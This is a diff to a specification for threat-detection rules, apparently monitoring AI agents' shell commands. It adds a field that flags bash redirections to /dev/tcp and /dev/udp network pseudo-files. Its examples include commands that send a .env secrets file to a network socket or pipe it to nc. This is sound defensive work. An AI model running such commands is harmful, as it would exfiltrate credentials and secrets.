@@ -79,7 +79,7 @@ Exactly one of `match` or `correlation` must be present. Required:
 | Field | Required | Type / values | Meaning |
 |---|---|---|---|
 | `id` | yes | string `^[a-z0-9][a-z0-9-]*$` | Stable unique identity. Unique across the pack. Flows to `policy.id` on a finding. |
-| `spec` | no | `threat-rules/v<major>[.<minor>]` (default `threat-rules/v1`) | Minimum spec version the rule needs. Required when the rule uses a feature added after v1: v1.1 or later for `correlation.order`, v1.2 or later for `e.command.parsed_commands`, v1.3 or later for its `args`, `file_reads` and `script_sends`. See [Versioning](#versioning). |
+| `spec` | no | `threat-rules/v<major>[.<minor>]` (default `threat-rules/v1`) | Minimum spec version the rule needs. Required when the rule uses a feature added after v1: v1.1 or later for `correlation.order`, v1.2 or later for `e.command.parsed_commands`, v1.3 or later for its `args`, `file_reads`, `script_sends` and `socket_redirects`, and for a call to a [predicate](#predicates). See [Versioning](#versioning). |
 | `version` | yes | int ≥ 1 | Rule content revision; bump on logic change. |
 | `title` | yes | string | Human-readable name. Flows to `policy.name`. |
 | `description` | no | string | Documentation only; never evaluated. |
@@ -202,7 +202,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   assignments before the command, `""` for an unknown value), `file_effects` (the files the
   command evidently writes, `{path, op}`, of the command `name` names), `file_reads` and
   `script_sends` (the files it evidently takes as input and the ones its inline script
-  sends, below), `pipeline` (shared by the stages of one
+  sends, below), `socket_redirects` (its redirections to a network pseudo-file, below),
+  `pipeline` (shared by the stages of one
   pipeline), `stage` (0-based position in it; a command inside a compound stage such as
   `{ a; b; } | c` or `(a) | c` carries that stage unless it is a stage of an inner pipeline
   or inside a substitution) and `nested` (inside a command or process
@@ -312,6 +313,20 @@ the steps in both orders still fires once. A single event never satisfies two st
   variable, nor data that crosses the boundary of a shell's script (`bash -c 'cat .env' | nc
   ..` reports the read on `cat`, not on `nc`). The reference derivation is
   `shellcmd.FileReads`.
+- `socket_redirects` (since v1.3; a rule that selects it MUST declare
+  `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` lists the
+  command's redirections to or from bash's network pseudo-files, each `{path, op}`. `path` is
+  the target as written without its quotes, when it begins `/dev/tcp/` or `/dev/udp/` and
+  names something after it: `/dev/tcp/host.example/4444`, and `/dev/tcp/$HOST/$PORT` as
+  written. `op` is `write` for `>`, `>>`, `>|`, `&>`, `&>>` and `>&`, `read` for `<` and
+  `<&`, and `readwrite` for `<>`. A redirection that duplicates a descriptor (`>&3`, `<&3`)
+  is one when an earlier `exec` with no command, in the same shell or in the one that started
+  this subshell or substitution, left that descriptor open on a pseudo-file: its `path` is
+  that pseudo-file and its `op` the direction of the duplication, so in
+  `exec 3<>/dev/tcp/h/1; cat .env >&3` the `exec` entry has `{/dev/tcp/h/1, readwrite}` and
+  the `cat` entry `{/dev/tcp/h/1, write}`. A later `exec` that closes the descriptor or
+  points it elsewhere ends that. The same path as a word of a command is not a redirection.
+  The reference derivation is `shellcmd.SocketRedirects`.
 - `e.system_context` is on the wire, not derived: on `session.context` it names what the
   runtime gave the model. `kind` is `skill_listing` for a skill index, `source` is where
   Beacon read it (`system_prompt`, `transcript`), and `skills` names each listed skill as
@@ -498,7 +513,8 @@ v1.1 field, as an unknown field, and refuse the directory that contains it.
 
 ### Changelog
 
-- **v1.3**: `args`, `file_reads` and `script_sends` on each entry of `e.command.parsed_commands`.
+- **v1.3**: `args`, `file_reads`, `script_sends` and `socket_redirects` on each entry of
+  `e.command.parsed_commands`.
   `name` and `file_effects` find the command behind `timeout`, `nice`, `ionice`, `stdbuf`,
   `doas`, `torsocks` and `proxychains`, without a Windows executable's suffix and after a
   PowerShell assignment, and a shell's here-document or here-string script, and a PowerShell's
